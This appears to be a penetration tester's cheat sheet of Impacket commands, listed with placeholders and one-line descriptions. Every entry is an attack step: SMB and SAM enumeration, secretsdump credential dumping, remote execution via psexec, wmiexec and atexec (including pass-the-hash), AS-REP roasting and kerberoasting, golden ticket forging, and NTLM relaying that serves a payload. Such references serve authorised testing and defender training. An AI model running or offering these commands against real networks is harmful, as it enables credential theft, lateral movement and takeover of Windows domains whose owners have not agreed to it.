# Impacket

% impacket, windows, smb, 445

## smbclient - connect to smb on the target
```
smbclient.py <domain>/<user>:<password>@<ip>
```

## smbserver - share smb folder
```
impacket-smbserver <shareName> <sharePath>
```

## smbserver - share smb folder with authentication
```
impacket-smbserver -username <username> -password <password> <shareName> <sharePath>
```

## lookupsid - SID User Enumeration,  extract the information about what users exist and their data. 
```
lookupsid.py <domain>/<user>:<password>@<ip>
```

## reg - query registry info remotely
```
reg.py <domain>/<user>:<password>@<ip> query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s
```

## rpcdump - list rpc endpoint
```
rpcdump.py <domain>/<user>:<password>@<ip>
```

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
```
samrdump.py <domain>/<user>:<password>@<ip>
```

## services.py - (start, stop, delete, read status, config, list, create and change any service) remote
```
services.py <domain>/<user>:<password>@<ip> <action>
``` 

## getarch - find target architecture (64 or 32 bits)
```
getArch.py -target <ip>
```

## netview - enumeration tool (ip/shares/sessions/logged users) - need dns set
```
netview.py <domain>/<user> -target <ip> -users <users_file>
```

## secretdump
```
secretsdump.py '<domain>/<user>:<pass>'@<ip>
```

% impacket, windows, exec

## PSEXEC with username // create a new service (using \pipe\svcctl via SMB)
```
psexec.py <domain>/<user>:<password>@<ip>
```

## PSEXEC with Hash // create a new service (using \pipe\svcctl via SMB)
```
psexec.py -hashes <hash> <user>@<ip>
```

## PSEXEC with kerberos // create a new service (using \pipe\svcctl via SMB)
```
export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
```

## wmiexec (execute a command shell without touching the disk or running a new service using DCOM)
```
wmiexec.py <domain>/<user>:<password>@<ip>
```

## wmiexec  with hash (execute a command shell without touching the disk or running a new service using DCOM)
```
wmiexec.py -hashes <hash> <user>@<ip>
```

## atexec - execute command view the task scheduler (using \pipe\atsvc via SMB)
```
atexec.py <domain>/<user>:<password>@<ip> "command"
```

## atexec hashes - execute command view the task scheduler (using \pipe\atsvc via SMB)
```
atexec.py -hashes <hash> <user>@<ip> "command"
```

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT
```
GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account
```
GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
```
ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
```
ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
```
getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
```
GetADUSers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
```

## ntlmrelay - host a payload that will automatically be served to the remote host connecting
```
impacket-ntlmrelayx -tf <targets_file> -e <payload_file>
```

## ntlmrelay - to use with mitm6
```
impacket-ntlmrelayx -wh <ip_server_hosting_wpad_file> -t smb://<target_ip>/ -i
```
